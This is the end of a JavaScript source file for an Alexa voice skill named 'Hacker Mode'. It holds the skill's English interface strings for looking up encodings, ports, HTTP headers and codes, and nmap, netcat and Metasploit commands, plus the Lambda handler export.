			NMAP: nmap.NMAP_EN_US,
			NETCAT: netcat.NETCAT_EN_US,
			METASPLOIT: metasploit.METASPLOIT_EN_US,
			RESPONSECODES: responsecodes.RESPONSECODES_EN_US,
			
            SKILL_NAME: 'Hacker Mode',
            WELCOME_MESSAGE0: "Now in hacker mode! Ask me about HTML, URL, hex and ASCII encoding and other hackery things.",
            WELCOME_MESSAGE1: "Entering hacker mode! I know net-cat, Metasploit and N-map and many other things.",
            WELCOME_MESSAGE2: "I'm a one woman hacking army! Ask me about things like web headers and HTTP verbs and other leet things.",
            WELCOME_MESSAGE3: "Activating my inner hacker. Angelina would be so jealous of my skills with encodings and hacking tools.",
            WELCOME_MESSAGE4: "World renowned hacker at your service. I can answer questions about ports and HTTP response codes etc.",

            WELCOME_REPROMPT: 'For instructions on what you can say in Hacker Mode, please say help me. You can leave at any time by saying Stop.',
            HELP_MESSAGE: "You can ask a question like, what\'s the HTML encoding for ampersand? Or, what is the command for sending a file with netcat? I'll also send the syntax to the Alexa app and web site. Or, you can say exit or stop to quit.",
            HELP_REPROMT: "You can say things like, what\'s the command for search exploit in metasploit? Or what is the web header referer? Or you can say exit or stop to quit... Now, what can I help you with?",
            STOP_MESSAGE: 'Goodbye!',
  
			PORTS_REPEAT_MESSAGE: 'Try saying repeat.',
            PORTS_NOT_FOUND_MESSAGE: "I'm sorry, I don't know, try asking in a different way",
            PORTS_NOT_FOUND_WITH_ITEM_NAME: "The requested port %s is not known",
            PORTS_NOT_FOUND_WITHOUT_ITEM_NAME: "The port number you asked for was not found",
            PORTS_NOT_FOUND_REPROMPT: 'What other port can I help find?',
			PORTS_DISPLAY_CARD_TITLE: 'PORT %s ',
			
			HTMLENCODING_REPEAT_MESSAGE: 'Try saying repeat.',
            HTMLENCODING_NOT_FOUND_MESSAGE: "I'm sorry, I don't know, try asking in a different way ",
            HTMLENCODING_NOT_FOUND_WITH_ITEM_NAME: "I don't know the HTML encoding for %s ",
            HTMLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that HTML encoding ",
            HTMLENCODING_NOT_FOUND_REPROMPT: 'What else can I help with?',
			HTMLENCODING_DISPLAY_CARD_TITLE: 'The HMTL Encoding for %s',
             
			HEXENCODING_REPEAT_MESSAGE: 'Try saying repeat.',
            HEXENCODING_NOT_FOUND_MESSAGE: "I'm sorry, I don't know, try asking in a different way ",
            HEXENCODING_NOT_FOUND_WITH_ITEM_NAME: 'the Hex encoding for %s ',
            HEXENCODING_NOT_FOUND_WITHOUT_ITEM_NAME: "I don't know that hex encoding ",
            HEXENCODING_NOT_FOUND_REPROMPT: 'What else can I help with?',
			HEXENCODING_DISPLAY_CARD_TITLE: 'The Hex Encoding for %s',

			ASCIIENCODING_REPEAT_MESSAGE: 'Try saying repeat.',
            ASCIIENCODING_NOT_FOUND_MESSAGE: "I'm sorry, I don't know, try asking in a different way ",
            ASCIIENCODING_NOT_FOUND_WITH_ITEM_NAME: "I don't know the ASCII encoding for %s ",
            ASCIIENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that ASCII encoding ",
            ASCIIENCODING_NOT_FOUND_REPROMPT: 'What else can I help with?',
			ASCIIENCODING_DISPLAY_CARD_TITLE: 'The ASCII Encoding for %s',

 			URLENCODING_REPEAT_MESSAGE: 'Try saying repeat.',
            URLENCODING_NOT_FOUND_MESSAGE: "I\'m sorry, I don\'t know, try asking in a different way",
            URLENCODING_NOT_FOUND_WITH_ITEM_NAME: 'the URL encoding for %s ',
            URLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  'I don\'t know that URL encoding',
            URLENCODING_NOT_FOUND_REPROMPT: 'What else can I help with?',
			URLENCODING_DISPLAY_CARD_TITLE: 'The URL Encoding for %s',
			
			WEBHEADERS_REPEAT_MESSAGE: 'Try saying repeat.',
            WEBHEADERS_NOT_FOUND_MESSAGE: "I'm sorry, I don't know, try asking in a different way ",
            WEBHEADERS_NOT_FOUND_WITH_ITEM_NAME: "I can't find the web header %s ",
            WEBHEADERS_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that web header ",
            WEBHEADERS_NOT_FOUND_REPROMPT: 'What else can I help with? ',
            WEBHEADERS_DISPLAY_CARD_TITLE: 'The web header matching %s is',
			
			HTTPVERBS_REPEAT_MESSAGE: 'Try saying repeat.',
            HTTPVERBS_NOT_FOUND_MESSAGE: "I'm sorry, I don't know, try asking in a different way",
            HTTPVERBS_NOT_FOUND_WITH_ITEM_NAME: "I can't find the HTTP verb for %s ",
            HTTPVERBS_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that HTTP verb ",
            HTTPVERBS_NOT_FOUND_REPROMPT: 'What else can I help with?',
			HTTPVERBS_DISPLAY_CARD_TITLE: 'The HTTP Verb matching %s',
			
			NMAP_REPEAT_MESSAGE: 'Try saying repeat.',
            NMAP_NOT_FOUND_MESSAGE: "I'm sorry, I don't know, try asking in a different way ",
            NMAP_NOT_FOUND_WITH_ITEM_NAME: "I couldn't find the NMAP command for %s. ",
            NMAP_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that NMAP scan type ",
            NMAP_NOT_FOUND_REPROMPT: 'What else can I help with?',
			NMAP_DISPLAY_CARD_TITLE: 'The NMAP command for %s',			
			
			NETCAT_REPEAT_MESSAGE: 'Try saying repeat.',
            NETCAT_NOT_FOUND_MESSAGE: "I'm sorry, I don't know, try asking in a different way ",
            NETCAT_NOT_FOUND_WITH_ITEM_NAME: "I can't find the NetCat command for %s ",
            NETCAT_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know the net cat command for that ",
            NETCAT_NOT_FOUND_REPROMPT: 'What else can I help with?',
			NETCAT_DISPLAY_CARD_TITLE: 'The NetCat command for %s',
			
			METASPLOIT_REPEAT_MESSAGE: 'Try saying repeat.',
            METASPLOIT_NOT_FOUND_MESSAGE: "I'm sorry, I don't know that meta sploit command or function.",
            METASPLOIT_NOT_FOUND_WITH_ITEM_NAME: "I can't find the Meta sploit command for %s ",
            METASPLOIT_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that Meta sploit function ",
            METASPLOIT_NOT_FOUND_REPROMPT: 'What else can I help with? ',
            METASPLOIT_DISPLAY_CARD_TITLE: 'The Metaploit command for %s',
			
			RESPONSECODES_REPEAT_MESSAGE: 'Try saying repeat.',
            RESPONSECODES_NOT_FOUND_MESSAGE: "I'm sorry, I didn't quite understand that HTTP response code. ",
            RESPONSECODES_NOT_FOUND_WITH_ITEM_NAME: "I can't find the HTTP response code for %s ",
            RESPONSECODES_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that HTTP response code.",
            RESPONSECODES_NOT_FOUND_REPROMPT: 'What elase can I help with? ',
            RESPONSECODES_DISPLAY_CARD_TITLE: 'The HTTP response code %s',
        },     
    },         
};             
               
exports.handler = (event, context) => {
    const alexa = Alexa.handler(event, context);
    alexa.APP_ID = APP_ID;
    // To enable string internationalization (i18n) features, set a resources object.
    alexa.resources = languageStrings;
    alexa.registerHandlers(handlers);
    alexa.execute();
};             
               